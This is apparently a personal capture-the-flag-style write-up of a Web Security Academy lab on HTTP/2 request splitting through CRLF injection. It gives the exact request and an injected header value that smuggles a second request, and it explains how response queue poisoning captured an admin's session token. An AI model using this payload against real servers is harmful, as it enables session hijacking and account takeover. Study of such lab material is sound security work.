CRLF injection (Carriage return line feed injection)

Lab: HTTP/2 request splitting via CRLF injection

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

To solve the lab, delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.



solving this lab took sending the following request:

'''
GET / HTTP/2
Host: 0a7c005a04d7a2d282939db4001c00d3.web-security-academy.net
Cookie: session=2JD8TFzFOFy4jKE1dT9VnCN52tQIi2Ne
Referer: 0a7c005a04d7a2d282939db4001c00d3.web-security-academy.net
Foo: [inspector tab value (or kettled request)]
'''


with the foo header with the following value in the inspector tab of burp:
bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: 0a7c005a04d7a2d282939db4001c00d3.web-security-academy.net


sending this request would give a 200, however the follow up request would most of the time give a 404 as the /x path does not exist.

However as this exploit uses response que poisoning, if the admin was to log in and after getting my 200 response for sending the initial
request and sending another one i would get the 302 redirect of the admin logging in along with thei session token, which was used to log in as them
and complete the lab.


note: This took a very long time to work as these kinds of HTTP request smuggling labs can be flakey and the timing needs to line up perfect.